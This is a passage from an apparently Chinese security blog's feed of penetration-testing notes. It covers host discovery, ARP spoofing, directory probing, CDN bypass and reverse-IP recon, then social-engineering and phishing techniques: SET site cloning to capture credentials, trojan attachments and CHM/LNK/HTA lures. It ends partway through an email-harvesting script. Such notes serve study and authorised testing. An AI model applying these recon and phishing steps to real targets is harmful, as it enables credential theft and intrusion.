&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171754479.png&#34; alt=&#34;image-20230317175413383&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;URG：表示紧急指针是否有效；&lt;/li&gt;
&lt;li&gt;ACK：表示确认号是否有效，携带 ACK 标志的数据报文段为确认报文段；&lt;/li&gt;
&lt;li&gt;PSH：表示是带有 PUSH 标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满；&lt;/li&gt;
&lt;li&gt;RST：表示出现严重差错。可能需要重现创建 TCP 连接。还可以用于拒绝非法的报文段和拒绝连接请求；&lt;/li&gt;
&lt;li&gt;SYN：表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步；&lt;/li&gt;
&lt;li&gt;FIN：表示发送方没有数据要传输了，要求释放连接；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用 TCP 的三次握手原理进行主机存活探测，当向目标主句直接发送 ACK 数据包时，如果目标主机存活就会返回一个 RST 数据包，以终止这个不支持的链接。其工作原理主要以来于目标主句响应数据包的 flags 指端，如果这个 flags 字段有值则表示主机存活，&lt;/p&gt;
&lt;h3 id=&#34;udp主机存活探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udp主机存活探测&#34;&gt;#&lt;/a&gt; UDP 主机存活探测&lt;/h3&gt;
&lt;p&gt;UDP 是一种利用 IP 提供面向无连接的网络通信服务，UDP 会把应用程序发来的数据，在收到的一刻立即原样发送到网络上，即使在网络传输过程中出现丢包、顺序错乱等情况，UDP 也不会负责重新发送以及纠错。&lt;/p&gt;
&lt;h2 id=&#34;arp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp&#34;&gt;#&lt;/a&gt; ARP&lt;/h2&gt;
&lt;h3 id=&#34;概述-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述-2&#34;&gt;#&lt;/a&gt; 概述&lt;/h3&gt;
&lt;p&gt;地址解析协议 (ARP,Address Resolution Protocol) 根据 IP 地址获取物理地址的一个 TCP/IP 协议。以太网协议规定，同一网段中的一台主机要和另一台主机进行直接通信，必须知道目标主机的 MAC 地址，此时需要 ARP 协议来完成 IP 地址到 MAC 地址的转换。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171811601.png&#34; alt=&#34;image-20230317181124564&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PC1 知道 PC3 的 IP 地址为 192.168.1.3，然后 PC1 会检查自己的 APR 缓存表中是否有 PC3 对应的 MAC 地址。&lt;/li&gt;
&lt;li&gt;如果 PC1 有 PC3 MAC 地址，则进行通信。如果没有，PC1 通过广播方式给网络上的每一台主机发送 ARP 请求，询问 192.168.1.3 对应的 MAC 地址。ARP 请求中同时也包含了 PC1 的 IP 地址和 MAC 地址。以太网内的所有主机都会接收到 ARP 请求，并检查是否与自己的 IP 地址匹配。如果不匹配，则丢弃该 ARP 请求。&lt;/li&gt;
&lt;li&gt;PC3 确定 ARP 请求中的 IP 地址与自己的 IP 地址匹配，则将 ARP 请求中 PC1 的 IP 地址和 MAC 地址添加到本地 ARP 缓存中。PC3 将自己的 MAC 地址发送给 PC1。&lt;/li&gt;
&lt;li&gt;PC1 收到 PC3 的 ARP 响应时，将 PC3 的 IP 地址和 MAC 地址都更新到本地 ARP 缓存表中。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;arp主机欺骗&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp主机欺骗&#34;&gt;#&lt;/a&gt; ARP 主机欺骗&lt;/h3&gt;
&lt;p&gt;ARP 欺骗 (ARP spoofing) 又称 ARP 毒化，是针对以太网地址解析协议的一种攻击技术。通过 ARP 欺骗可让攻击者获取局域网上的数据包甚至可篡改数据包，并且可让网络上特定计算机或所有计算机无法正常连线。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;假设一个网络环境中有三台主机，分别为主机A、B、C。详细信息如下描述：
A的地址为：IP：192.168.10.1 MAC: AA-AA-AA-AA-AA-AA
B的地址为：IP：192.168.10.2 MAC: BB-BB-BB-BB-BB-BB
C的地址为：IP：192.168.10.3 MAC: CC-CC-CC-CC-CC-CC
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171814633.png&#34; alt=&#34;image-20230317181431599&#34; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;B 向 A 发送一个自己伪造的 ARP 应答，而这个应答中的数据发送方的 IP 地址是 192.168.10.3（C 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（C 的 MAC 地址本来应该是 CC-CC-CC-CC-CC-CC，这里 C 被伪造了）。&lt;/li&gt;
&lt;li&gt;当 A 接收到 B 伪造的 ARP 应答，会更新本地的 ARP 缓存（A 被欺骗了），这时 B 就伪装成 C 了。&lt;/li&gt;
&lt;li&gt;同时，B 同样向 C 发送一个 ARP 应答，应答包中发送方 IP 地址是 192.168.10.1（A 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（A 的 MAC 地址本来应该是 AA-AA-AA-AA-AA-AA）。&lt;/li&gt;
&lt;li&gt;当 C 收到 B 伪造的 ARP 应答，也会更新本地 ARP 缓存（C 也被欺骗了），这时 B 就伪装成了 A。这样主机 A 和 C 都被主机 B 欺骗，A 和 C 之间通讯的数据都经过了 B，主机 B 完全可以知道他们之间传输的任何信息。这就是典型的 ARP 欺骗过程。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;arp主机发现的原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp主机发现的原理&#34;&gt;#&lt;/a&gt; ARP 主机发现的原理&lt;/h3&gt;
&lt;p&gt;当目标主机与我们处于同一个以太网的时候，可以利用 ARP 协议进行主机发现，该种扫描方式速度较快、识别精准。我们通过利用 Scapy 进行 ARP 主机发现，若主机存活，则会响应我们的 ARP 请求，否则不会响应。&lt;/p&gt;
&lt;h2 id=&#34;端口指纹识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口指纹识别&#34;&gt;#&lt;/a&gt; 端口指纹识别&lt;/h2&gt;
&lt;h3 id=&#34;概述-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述-3&#34;&gt;#&lt;/a&gt; 概述&lt;/h3&gt;
&lt;p&gt;在 Internet 上，各主机间通过 TCP/IP 协议发送和接收数据包，各个数据包根据其目的主机的 ip 地址来进行互联网络中的路由选择，把数据包顺利的传送到目的主机进程分配协议端口。&lt;/p&gt;
&lt;p&gt;简单来说，如果把服务器看作一栋房子，那么端口就是可以进出这栋房子的门。真正的房子只有一个或几个门，服务器至多有 65536 个门。不同的端口（门）可以指向不同的服务（房间）。&lt;/p&gt;
&lt;h3 id=&#34;常用端口对应的服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用端口对应的服务&#34;&gt;#&lt;/a&gt; 常用端口对应的服务&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171838057.png&#34; alt=&#34;image-20230317183857978&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171839596.png&#34; alt=&#34;image-20230317183908525&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;敏感目录探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#敏感目录探测&#34;&gt;#&lt;/a&gt; 敏感目录探测&lt;/h2&gt;
&lt;h3 id=&#34;概述-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述-4&#34;&gt;#&lt;/a&gt; 概述&lt;/h3&gt;
&lt;p&gt;敏感目录探测属于信息搜集的一部分，善于发现隐藏的信息。例如：备份文件、数据库、网站路径、后门文件、管理后台登陆界面等，对渗透测试具有事半功倍的作用。&lt;/p&gt;
&lt;p&gt;通常用于进行敏感目录的常见工具有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;御剑目录爆破工具&lt;/li&gt;
&lt;li&gt;Dirsearch&lt;/li&gt;
&lt;li&gt;DirBrute&lt;/li&gt;
&lt;li&gt;7kbscan-WebPathBrute&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;response状态码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#response状态码&#34;&gt;#&lt;/a&gt; Response 状态码&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847429.png&#34; alt=&#34;image-20230317184701370&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847944.png&#34; alt=&#34;image-20230317184725880&#34; /&gt;&lt;/p&gt;
&lt;p&gt;敏感目录探测作用:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;探测网站真实目录；&lt;/li&gt;
&lt;li&gt;探测系统敏感目录；&lt;/li&gt;
&lt;li&gt;探测 web 服务备份文件；&lt;/li&gt;
&lt;li&gt;查询网站右后门文件；&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
            <title>被动信息收集</title>
            <link>https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
            <category term="被动信息收集" scheme="https://blog.xcu.icu/tags/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
            <pubDate>Mon, 20 Mar 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;在渗透测试的过程中，无论你是在进行 web 渗透还是，内网渗透还是域渗透，收集到关于目标系统更加全面的信息是非常重要的，信息收集贯穿整个渗透测试的生命周期中，通常我们将信息收集分为主动信息收集和被动信息收集&lt;/p&gt;
&lt;p&gt;被动信息收集&lt;/p&gt;
&lt;p&gt;主要是指不与目标主机进行直接交互，通常根据搜索引擎或者社交等方式间接的获取目标服务器的信息。常见的信息收集主要包括：子域名收集，IP 地址查询，域名反查，whois 查询，邮件收集，github 源码泄露等&lt;/p&gt;
&lt;h2 id=&#34;域名查ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名查ip&#34;&gt;#&lt;/a&gt; 域名查 IP&lt;/h2&gt;
&lt;p&gt;IP 查询是通过当前所获取到的 url 去查询对应 ip 地址的过程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;可以应用 Socket 库函数中的 gethostbyname () 函数获域名对应的 ip 值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket

print(socket.gethostbyname(&#39;www.baidu.com&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;也可以直接去 ping 域名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303131342359.png&#34; alt=&#34;image-20230313134257301&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是这样拿到的 ip 不一定是真实 ip，可能存在 CDN，我们可以通过这个网站&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuMTdjZS5jb20v&#34;&gt; http://www.baidu.com GET 测试结果 网站速度测试 17CE&lt;/span&gt; 通过全国各地的 ping，看域名是否一致，如果不一致我们就可以认定，这里打开了 CDN，反之一直就可以认定其为真实 ip&lt;/p&gt;
&lt;h3 id=&#34;绕过cdn查找真实ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过cdn查找真实ip&#34;&gt;#&lt;/a&gt; 绕过 CDN 查找真实 IP&lt;/h3&gt;
&lt;p&gt;CDN 是 Content Delivery Network 的缩写，翻译成中文是内容分发网络。它是一种通过在全球范围内部署服务器来提高网站访问速度和性能的技术。CDN 的主要目的是通过将网站的静态资源（如图片、视频、CSS、JavaScript 等）缓存到离用户更近的服务器上，从而加快用户访问网站的速度。当用户请求访问网站时，CDN 会自动选择离用户最近的服务器来提供内容，从而减少了网络延迟和带宽使用，提高了网站的访问速度和性能。&lt;/p&gt;
&lt;p&gt;下面几种常见的绕过 CDN 防护寻找真实 ip 的方法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标邮件系统：一般的邮件系统都在内部，没有进行 CDN 解析，通过目标网站的用户注册 / 登录等功能，寻找邮件服务器域名 ip&lt;/li&gt;
&lt;li&gt;扫描敏感文件：如 phpinfo 泄露，github 信息泄露，命令执行等，可在敏感文件中寻找到真实 ip&lt;/li&gt;
&lt;li&gt;国外访问：国内的 CDN 往往只对国内的用户访问加速，因此可通过国外的代理，或者服务器访问，可能会拿到真实 ip&lt;/li&gt;
&lt;li&gt;分站域名：很多服务器主站的访问量会比较大，所以主站挂 dns，但是分站没有 CDN&lt;/li&gt;
&lt;li&gt;利用&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20v&#34;&gt; Access denied (securitytrails.com)&lt;/span&gt; 平台，查找历史记录来寻找到真实 ip&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;验证获取的ip地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证获取的ip地址&#34;&gt;#&lt;/a&gt; 验证获取的 ip 地址&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;找到目标的真实 IP 后，如果是 web 服务，最简单的方式就是直接用 IP 访问，看响应的页面和访问域名的一致&lt;/li&gt;
&lt;li&gt;借助端口扫描工具，扫描对应的 IP 地址，并以 IP 地址加端口的形式进行访问，观察响应结果是否和目标站点一致&lt;/li&gt;
&lt;li&gt;借助第三方工具，查看该 ip 绑定的域名是否相同&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;whois查询和ip反查&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois查询和ip反查&#34;&gt;#&lt;/a&gt; whois 查询和 ip 反查&lt;/h2&gt;
&lt;h3 id=&#34;whois查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois查询&#34;&gt;#&lt;/a&gt; whois 查询&lt;/h3&gt;
&lt;p&gt;whois 查询是用来查询域名的 ip 以及所有者信息的传输协议，简单地说，whois 就是一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域名所有人，域名注册商等）。python 中的模块 python-whois 可用于 whois 的查询&lt;/p&gt;
&lt;p&gt;安装模块命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;pip install python-whois
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142100043.png&#34; alt=&#34;image-20230314210018924&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142101019.png&#34; alt=&#34;image-20230314210151250&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ip反查绑定域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip反查绑定域名&#34;&gt;#&lt;/a&gt; ip 反查绑定域名&lt;/h3&gt;
&lt;p&gt;当访问 ip 地址，查询不到网站目录，此时可以通过查询目标 IP 绑定的 url，通过访问该域名访问目标网站，多网站进行 web 渗透，常使用两个网站&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;域名查 iP 域名解析 iP 查询网站 iP 反查域名 iP 反查网站 同一 iP 网站 同 iP 网站域名 iP 查询 (ip138.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8yMjIuMTQwLjIzLjEzMy8=&#34;&gt;222.140.23.133 属于河南省 许昌市 魏都区 联通_IP 反查域名_同 IP 站点查询_同 ip 网站查询_爱站网 (aizhan.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142107615.png&#34; alt=&#34;image-20230314210706544&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里既然是 python 骗，这里贴上一个大佬的 python 脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
from bs4 import BeautifulSoup
import re
from optparse import OptionParser


def main():
    parser = OptionParser(&amp;quot;Usage:%prog -i &amp;lt;target host&amp;gt; &amp;quot;)   # 输出帮助信息
    parser.add_option(&#39;-i&#39;,type=&#39;string&#39;,dest=&#39;IP&#39;,help=&#39;specify target host&#39;)   # 获取ip地址参数
    options,args = parser.parse_args()
    print(&amp;quot;Search for &amp;quot; + options.IP + &amp;quot;\n&amp;quot;)
    headers = &amp;#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#39;,
               &#39;Accept&#39;: &#39;*/*&#39;
               &amp;#125;
    url = &amp;quot;https://site.ip138.com/&amp;quot;+options.IP
    r = requests.get(url,headers=headers)
    pattern = re.compile(&#39;&amp;lt;li&amp;gt;&amp;lt;span class=&amp;quot;date&amp;quot;.*?&amp;lt;/li&amp;gt;&#39;,re.S)
    content = re.findall(pattern,r.text)
    for line in content:
        soup = BeautifulSoup(line,&#39;lxml&#39;)
        url = soup.a.attrs[&#39;href&#39;]
        print(url.strip(&#39;/&#39;))

if __name__ == &amp;quot;__main__&amp;quot;:
    try:
        main()
    except KeyboardInterrupt:
        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web指纹识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web指纹识别&#34;&gt;#&lt;/a&gt; web 指纹识别&lt;/h2&gt;
&lt;p&gt;主要是为了探究目标网站的 CMS，通过网上已经公开的快速的进行漏洞验证对目标渗透测试过程中，目标的 cms 是十分重要的信息，有了目标的 cms，就可以利用相关 bug 进行测试，进行代码审计等。&lt;/p&gt;
&lt;p&gt;有很多开源的工具和指纹库，如 fofa、WhatWeb、w11scan、WebEye.&lt;/p&gt;
&lt;h2 id=&#34;域名解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名解析&#34;&gt;#&lt;/a&gt; 域名解析&lt;/h2&gt;
&lt;p&gt;DNS 是互联网上作为域名和 ip 地址相互映射的一个分布式数据库，通过 DNS 使得用户更方便的访问互联网，而不是去记忆能够被机器读取的 IP 地址，简单来说就是将域名解析成 IP 地址&lt;/p&gt;
&lt;p&gt;域名解析的特点：IP 地址对域名是一对多的关系&lt;/p&gt;
&lt;p&gt;常见的解析类型：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;A 记录解析：有被称为 ip 指向，用户可以在此设置子域名并指向到自己的目标主机 ip 地址上，从而通过域名找到服务器 （一一对应）&lt;/li&gt;
&lt;li&gt;CNAME 记录解析：有被称为别名指向，把域名解析到另一个地址，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS10ZXN0LWY5NmczMTVnd3gyYXB1dS5teWRvbWFpbi5jb20=&#34;&gt;比如设置 test.mydomain.com&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMueG4tLWNvbXRlc3Qtb2I0a3M5YmEzMDNsdmthdDYxZ3EyM2YyZTZkLm15ZG9tYWluLnhuLS1jb213d3ctcng4aTIyN20ybmNkM2F1MTViLnJkZG5zLmNvbQ==&#34;&gt;用来指向一个主机 www.rddns.com 那么以后就可以用 test.mydomain.com 来代替方法 www.rddns.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;MX 记录解析：有被称为邮件交换记录，用于以该域名为结尾的电子邮箱指向邮件服务器，如：用户所有的邮件结尾是以域名 mydomain.com 结尾，则需要在管理界面添加该域名的 MX 记录来处理所有以 @mydomain.com 结尾的邮件&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;域名服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名服务器&#34;&gt;#&lt;/a&gt; 域名服务器&lt;/h3&gt;
&lt;p&gt;根域名服务器：主要用来管理互联网的主目录，世界一个有 13 个根域名服务器，名字分别是 A 到 M&lt;/p&gt;
&lt;p&gt;顶级域名服务器：顶级域名就是在根域名的前面加上你自己定义的字母或者数字等字符&lt;/p&gt;
&lt;p&gt;二级域名服务器：当注册了一个顶级域名服务器后，列入 web.cn 就可以在互联网服务提供商的 dns 解析系统上面自由的分配二级域名或者三级域名&lt;/p&gt;
&lt;p&gt;权威名称服务器：名称服务器（DNS 服务器），用于保存特定域 / 地址的实际 DNS 记录（A,CNAME,PTR 等）。&lt;/p&gt;
&lt;h2 id=&#34;基于搜索引擎的子域名收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于搜索引擎的子域名收集&#34;&gt;#&lt;/a&gt; 基于搜索引擎的子域名收集&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Site：特定域名下进行搜索。&lt;/li&gt;
&lt;li&gt;Domain：查询自身网站的外部链接。&lt;/li&gt;
&lt;li&gt;Inurl：指令用于搜索查询词出现在 url 中的页面。&lt;/li&gt;
&lt;li&gt;Intitle：进行搜索含关键字的标题。&lt;/li&gt;
&lt;li&gt;Info：查找指定站点的一些基本信息。&lt;/li&gt;
&lt;li&gt;Filetype：只搜索某些特定类型的文件格式。&lt;/li&gt;
&lt;li&gt;Link：返回所有和 xxxxxxx 做了链接的 URLIndex：返回的网页中在正文部分包含关键词。&lt;/li&gt;
&lt;li&gt;Define：搜索某个词语的定义 And：利用 and 表示前后两个关键词是 “与” 的逻辑关系，例如 “SEO and 网络营销”，就会找出将包含 SEO 和网络营销有关的网站。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;社工攻击概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#社工攻击概述&#34;&gt;#&lt;/a&gt; 社工攻击概述&lt;/h2&gt;
&lt;p&gt;下面是一个流程的攻击链&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142235808.png&#34; alt=&#34;image-20230314223533399&#34; /&gt;&lt;/p&gt;
&lt;p&gt;社会工程攻击，是一种利用 “社会工程学” 来实施的网络攻击行为&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;供应链攻击：针对各类软件，供应商，合作商等进行攻击的攻击方式&lt;/li&gt;
&lt;li&gt;水坑攻击：通过猜测观察目标的经常访问的网站，并入侵其中一个或者多个，植入恶意软件，达到感染该组目标中部分成员的目的&lt;/li&gt;
&lt;li&gt;物理攻击 - USB 摆渡：散播 USB 攻击：Autorun.inf，BadUSB，u 盘，鼠标，键盘，USB 风扇，USB 灯；&lt;/li&gt;
&lt;li&gt;物理攻击 - WIFI 攻击：内网 WIFI - 弱口令，内网 GuestWIFI，使用 wifi 钥匙一类的众筹密码产品&lt;/li&gt;
&lt;li&gt;物理攻击 - 人工渗透：伪造工牌，伪造工卡，伪造工作人员，物理开锁&lt;/li&gt;
&lt;li&gt;钓鱼邮件攻击：攻击这获取或者篡改邮件，病毒邮件，垃圾邮件，邮件炸弹等&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;邮件钓鱼攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮件钓鱼攻击&#34;&gt;#&lt;/a&gt; 邮件钓鱼攻击&lt;/h2&gt;
&lt;h3 id=&#34;伪造钓鱼网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪造钓鱼网站&#34;&gt;#&lt;/a&gt; 伪造钓鱼网站&lt;/h3&gt;
&lt;p&gt;做一个很像的前段，发一个链接让受害者去访问点击，获取受害者的账号密码&lt;/p&gt;
&lt;p&gt;使用 kali 的 Social-Engineer Toolkit&lt;/p&gt;
&lt;p&gt;首先选择社会工程学攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920220.png&#34; alt=&#34;image-20230316192014118&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着选择 web 网站攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161920740.png&#34; alt=&#34;image-20230316192055686&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着选择 5&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303161921076.png&#34; alt=&#34;image-20230316192143018&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接着选择 1，网站克隆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303162010771.png&#34; alt=&#34;image-20230316201016728&#34; /&gt;&lt;/p&gt;
&lt;p&gt;下面就是 ip 和目标网站了&lt;/p&gt;
&lt;h3 id=&#34;鱼叉攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#鱼叉攻击&#34;&gt;#&lt;/a&gt; 鱼叉攻击&lt;/h3&gt;
&lt;p&gt;利用木马程序作为邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马&lt;/p&gt;
&lt;p&gt;传统宏文件制作钓鱼邮件&lt;/p&gt;
&lt;h3 id=&#34;chm钓鱼&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chm钓鱼&#34;&gt;#&lt;/a&gt; CHM 钓鱼&lt;/h3&gt;
&lt;p&gt;CHM 已编译的帮助文件，它是微软新一代的帮助文件格式，利用 HTML 作为源文，把帮助内容以类似数据库的形式编译存储&lt;/p&gt;
&lt;h3 id=&#34;其他钓鱼方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他钓鱼方式&#34;&gt;#&lt;/a&gt; 其他钓鱼方式&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;OLE 钓鱼：&lt;br /&gt;
利用 word 中插入外部对象的方式&lt;/li&gt;
&lt;li&gt;LNK 钓鱼：&lt;br /&gt;
lnk 文件是用于指向其他文件的一种文件。这些文件通常被称为快捷方式&lt;/li&gt;
&lt;li&gt;HTA 钓鱼&lt;br /&gt;
 HTA 钓鱼是 HTML Application 的缩写，直接讲 HTML 保持成 HTA 的格式，是一个独立的应用软件&lt;/li&gt;
&lt;li&gt;捆绑马&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;目标邮箱收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标邮箱收集&#34;&gt;#&lt;/a&gt; 目标邮箱收集&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odW50ZXIuaW8v&#34;&gt;Find email addresses in seconds • Hunter (Email Hunter)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy52ZXJ5dnAuY29tLw==&#34;&gt;微匹 - 让每天都有新客户 (veryvp.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上面两个网站都说用来收集邮箱的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#-*- coding:utf-8 -*-
import sys
import getopt
import requests
from bs4 import BeautifulSoup
import re
import time
import threading

#banner信息
def banner():
    print(&#39;\033[1;34m########################################################################################\033[0m\n&#39;
          &#39;\033[1;34m######################################\033[1;32m贝塔安全实验室\033[1;34m#####################################\033[0m\n&#39;
          &#39;\033[1;34m########################################################################################\033[0m\n&#39;)
#使用规则
def usage():
    print(&#39;-h: --help 帮助;&#39;)
    print(&#39;-u: --url  域名;&#39;)
    print(&#39;-p: --pages 页数;&#39;)
    print(&#39;eg: python -u &amp;quot;www.baidu.com&amp;quot; -p 100&#39;+&#39;\n&#39;)
    sys.exit()
##未授权函数检测

#主函数，传入输入参数进入
def start(argv):
    url = &amp;quot;&amp;quot;
    pages = &amp;quot;&amp;quot;
    if len(sys.argv) &amp;lt; 2:
        print(&amp;quot;-h 帮助信息;\n&amp;quot;)
        sys.exit()
    #定义异常处理
    try:
        banner()
        opts,args = getopt.getopt(argv,&amp;quot;-u:-p:-h&amp;quot;)
    except getopt.GetoptError:
        print(&#39;Error an argument!&#39;)
        sys.exit()
    for opt,arg in opts:
        if opt == &amp;quot;-u&amp;quot;:
            url = arg
        elif opt == &amp;quot;-p&amp;quot;:
            pages = arg
        elif opt == &amp;quot;-h&amp;quot;:
            print(usage())
        threader(url, pages)


class MyThread(threading.Thread):
    def __init__(self, func, args=()):
        super(MyThread, self).__init__()
        self.func = func
        self.args = args

    def run(self):
        if self.args[1] &amp;lt; 1:
            pass
        else:
